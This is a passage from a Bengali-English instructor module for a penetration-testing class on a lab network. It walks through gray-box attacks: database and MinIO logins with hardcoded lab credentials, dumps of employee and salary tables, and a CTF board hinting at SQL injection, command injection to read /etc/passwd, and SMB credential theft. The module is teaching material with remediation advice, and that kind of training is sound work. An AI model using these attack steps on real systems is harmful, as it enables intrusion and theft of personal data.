+> `T1518 — Software Discovery (Monitoring Tools)`
+> `T1082 — System Information Discovery`
+
+---
+
+### 🏆 Gray-box Exclusive #4 — Crown Jewels: Production Database
+
+**বলো:**
+> *"এটাই সবচেয়ে important। Production database — company র সব critical data। Black-box এ port 5432 দেখা গিয়েছিল কিন্তু সেটা monitoring_db (limited)। Production DB আছে internal network এ — 10.0.3.20 — বাইরে থেকে accessible না। SMB share থেকে password পেয়েছি — এখন সরাসরি যাবো।"*
+
+```bash
+# Bastion থেকে production DB তে:
+# SMB share script থেকে পাওয়া credential ব্যবহার করো
+psql -h 10.0.3.20 -U nexus_admin -d nexus_prod
+Password: Nexu$$Prod2026!Sec
+
+-- Tables দেখো:
+\dt
+
+-- Employee data:
+SELECT id, name, email, department FROM employees LIMIT 10;
+
+-- 🏆 Crown Jewels:
+SELECT * FROM system_vault_keys;
+-- FLAG{CR0WN_J3W3LS_DC_D4T4B4S3_C0MPR0M1S3D_2026!}
+
+-- Salary records:
+SELECT * FROM salary_records LIMIT 5;
+```
+
+**WOW Moment — বলো:**
+> *"এই data real company থেকে বের হলে — GDPR violation, regulatory fine, reputation damage। CVSS 9.8 — Critical।*
+>
+> *Hacker হলে এই পর্যন্ত আসতে কতদিন লাগতো? Days, weeks। আমরা gray-box এ কত মিনিটে আসলাম?"*
+
+**MITRE ATT&CK:**
+> `T1005 — Data from Local System`
+> `T1213 — Data from Information Repositories`
+
+---
+
+### 💎 Gray-box Exclusive #5 — MinIO Backup Storage
+
+**বলো:**
+> *"MinIO হলো S3-compatible object storage। কোম্পানি এখানে database backup, config files রাখে। Port 9001 black-box এ দেখা গেছে কিন্তু credential ছাড়া ঢোকা যায়নি।"*
+
+```
+Browser: http://<VPS_IP>:9001
+Username: nexus_san_root
+Password: SuperS3cUr3_B4ckup_Vault_Pass_2026!
+
+→ Buckets দেখো
+→ Database backup files আছে কি?
+→ Config files download করো
+```
+
+**বলো:**
+> *"Backup storage এ production database এর full backup আছে — মানে attacker credential জানলেই সব data download করে নিতে পারে। Black-box এ এই password পাওয়া অনেক কঠিন ছিল।"*
+
+**MITRE ATT&CK:**
+> `T1530 — Data from Cloud Storage Object`
+
+---
+
+# 🛠️ PHASE 6 — Classwork / CTF (30 min)
+## *Students এর নিজের practice — আলাদা IP দিয়ে*
+
+**Students দের জন্য আলাদা environment:**
+
+```
+🎯 Challenge Board:
+
+FLAG 1 (Easy)    → http://[STUDENT_IP]/?track_id=
+                   SQLi করে employees table dump করো
+                   Hint: UNION based injection
+
+FLAG 2 (Medium)  → http://[STUDENT_IP]/admin/server-check
+                   Command injection করে /etc/passwd দেখাও
+                   Hint: semicolon injection
+
+FLAG 3 (Hard)    → SMB share থেকে DB credential বের করো,
+                   তারপর Production DB থেকে system_vault_keys
+                   Hint: smbclient //[IP]/IT-Backups
+
+FLAG 4 (Bonus)   → MinIO login করে backup bucket এর
+                   সবচেয়ে recent file এর নাম বলো
+```
+
+**Instructor role:**
+- Screen share দেখো কে কতদূর গেছে
+- Hint দাও stuck হলে
+- Leaderboard রাখো whiteboard এ
+
+---
+
+# 📊 PHASE 7 — Wrap-up: Kill Chain + Report Concept (15 min)
+
+---
+
+### 🔗 Full Kill Chain Timeline
+
+```
+📅 Black-box Phase:
+  └─ nmap -p- → 17+ open ports discovered
+  └─ FTP anonymous → internal files access
+  └─ Web portal SQLi → employee table dumped (FLAG 1)
+  └─ Command Injection → RCE (FLAG 2)
+  └─ SSH bastion → DMZ foothold
+
+  ⏹️ Black-box এ আটকে গেলাম:
+     → Internal networks (10.0.2.x / 10.0.3.x) invisible
+     → Production DB unreachable from outside
+     → AD credentials নেই → enumerate করা যাচ্ছে না
+
+  ↓ ── Gray-box Switch (Client info দিলো) ──
+
+📅 Gray-box Phase:
+  └─ Internal sweep → 10.0.2.x, 10.0.3.x hosts discovered
+  └─ Workstation bash history → DB credentials leaked
+  └─ SMB IT-Backups → sync_prod_db.sh → DB password
+  └─ Production PostgreSQL → system_vault_keys (FLAG 3)
+  └─ Grafana (10.0.2.21) → default creds → full network map
+  └─ SNMP → network device info dump
+  └─ MinIO backup bucket → production data downloadable
+
+  ✅ Gray-box এ যা পেলাম যা black-box এ পাওয়া যেত না:
+     → Internal network topology (10.0.2.x / 10.0.3.x)
+     → Production database credentials + data
+     → Monitoring system → full infra map
+     → Backup storage access
+     → Developer workstation credentials
+```
+
+---
+
+### 📝 Pentest Report — Quick Overview
+
+```
+1. Executive Summary (CEO/CFO এর জন্য — non-technical)
+   "আমরা আপনার কোম্পানিতে full access পেয়েছি।
+    সব employee data exposed। Production DB compromised।"
+
+2. Technical Findings (CVSS Score সহ)
+   → SQLi on Web Portal        — CVSS 9.8 (Critical)
+   → Command Injection          — CVSS 9.0 (Critical)
+   → Credentials in Bash History — CVSS 8.5 (High)
+   → SMB Share Credential Leak  — CVSS 8.1 (High)
+   → Production DB Direct Access — CVSS 9.8 (Critical)
+   → MinIO Misconfiguration     — CVSS 7.5 (High)
+
+3. Attack Chain Diagram
+
+4. Evidence (Screenshots, command outputs)
+
+5. Remediation
+   → Prepared statements (SQLi fix)
+   → Input validation (CMDi fix)
+   → Secrets management — no hardcoded credentials
+   → SMB access control review
+   → Network segmentation
+```
+
+---
+
+### 🎓 Closing — Key Takeaways
+
+**Board এ লেখো:**
+
+```
+📌 আজকের Lesson:
+
+Black-box → দেখায় কী publicly accessible
+Gray-box  → দেখায় সত্যিকারের security posture
+
+Black-box এ পেলাম:  2টা critical vuln
+Gray-box এ পেলাম:   6টা critical/high vuln
+                    (বেশিরভাগ Black-box এ সম্পূর্ণ invisible)
+
+Client কেন gray-box prefer করে?
+→ কম সময়, বেশি coverage, বেশি value
+```
+
+**Closing Quote:**
+> *"Real world-এ একজন attacker এর unlimited time আছে — days, weeks, months। তোমার কাছে নেই। Gray-box দিয়ে তুমি সেই time gap bridge করো। তুমি attacker এর চেয়ে smarter হও — কারণ তুমি smart কাজ করো, hard না।"*
+
+---
+
+**Next Class Preview:**
+> *"পরের class: Active Directory full exploitation — BloodHound, Kerberoasting, Pass-the-Hash, Golden Ticket। VoIP SIP brute-force। MQTT IoT takeover। Cloud SSRF + JWT attack।"*
+
+---
+
+# 📊 Module Summary
+
+| Metric | Value |
+|:---|:---:|
+| Total Duration | 4–5 Hours |
+| Black-box Flags | 2 (SQLi, CMDi) |
+| Gray-box Flags | 2+ (DB, MinIO) |
+| Attack Techniques | 10+ |
+| MITRE ATT&CK TTPs | 12 |
+| Services Covered | FTP, Telnet, HTTP, SMB, PostgreSQL, Grafana, SNMP, MinIO |
+| Key Teaching Point | Gray-box coverage vs Black-box limitation |
+
+---
+
+# 🎨 WOW Moments Checklist
+
+| Moment | কেন Impressive |
+|:---|:---|
+| `docker ps` — 33 containers | "পুরো একটা কোম্পানির নেটওয়ার্ক!" |
+| nmap -p- live scan | "সব port দেখছি — এটাই real recon" |
+| SQLi → employee dump | Real names, passwords visible |
+| CMDi → server shell | Browser থেকে server control |
+| Black-box limit board | "এখানেই hacker আটকে যায়" |
+| Gray-box switch announcement | Dramatic moment — "client এখন info দিলো" |
+| Bash history → DB password | "Developer নিজেই leak করেছে" |
+| SMB share → credentials | "IT carelessness = company compromise" |
+| Production DB → FLAG 3 | Crown Jewels moment |
+| Grafana dashboard | "পুরো network এর map একটা dashboard এ" |
+
+---
+
+*📌 এই module টা `docs/CLASS_MODULE_02.md` হিসেবে save করা আছে।*
